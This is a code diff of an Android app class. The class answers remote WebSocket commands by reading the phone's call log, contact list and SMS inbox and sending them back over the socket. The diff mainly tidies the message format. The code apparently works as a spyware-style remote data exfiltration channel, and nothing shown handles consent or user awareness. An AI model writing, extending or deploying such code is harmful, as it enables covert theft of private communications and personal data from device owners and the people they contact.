@@ -42,13 +42,11 @@ public class SocketInstance extends MainActivity{
         public void onOpen(WebSocket webSocket, Response response) {
             super.onOpen(webSocket, response);
             Log.d("WebSocketStatus","onOpenExecuted");
-            webSocket.send("ciao dal client!");
         }
 
         @Override
         public void onMessage(WebSocket webSocket, String text) {
             super.onMessage(webSocket, text);
-            webSocket.send("ho ricevuto da te questa richiesta: " + text);
 
             //parse JSON from request
             try {
@@ -56,16 +54,16 @@ public class SocketInstance extends MainActivity{
                 String parsedRequestType = jsonObject.getString("requestType");
                 switch(parsedRequestType){
                     case "reqStatus":
-                        webSocket.send(reqStatus());
+                        webSocket.send("status|" + reqStatus());
                         break;
                     case "reqCallLogs":
-                        webSocket.send(reqCallLogs(webSocket));
+                        webSocket.send("calllogs|" + reqCallLogs());
                         break;
                     case "reqContacts":
-                        webSocket.send(reqContacts(webSocket));
+                        webSocket.send("contacts|" + reqContacts());
                         break;
                     case "reqMessages":
-                        webSocket.send(reqMessages(webSocket));
+                        webSocket.send("messages|" + reqMessages());
                         break;
                     default:
                         Log.d("WebSocketStatus","ERROR IN PARSED REQUEST TYPE");
@@ -81,7 +79,7 @@ public class SocketInstance extends MainActivity{
             return "Everything is fine!";
         }
 
-        private String reqCallLogs(WebSocket webSocket) throws JSONException {
+        private String reqCallLogs() throws JSONException {
             // reading all data in descending order according to DATE
             String strOrder = android.provider.CallLog.Calls.DATE + " DESC";
             Uri callUri = Uri.parse("content://call_log/calls");
@@ -110,7 +108,7 @@ public class SocketInstance extends MainActivity{
         }
 
         @SuppressLint("Range")
-        private String reqContacts(WebSocket webSocket) throws JSONException {
+        private String reqContacts() throws JSONException {
             String phoneNo = "";
             JSONObject contactobj = new JSONObject();
             int idP = 0;
@@ -146,7 +144,7 @@ public class SocketInstance extends MainActivity{
             return contactobj.toString();
         }
 
-        private String reqMessages(WebSocket webSocket) throws JSONException {
+        private String reqMessages() throws JSONException {
             Uri uriSMSURI = Uri.parse("content://sms/inbox");
             Cursor cur = context.getContentResolver().query(uriSMSURI, null, null, null, null);
 
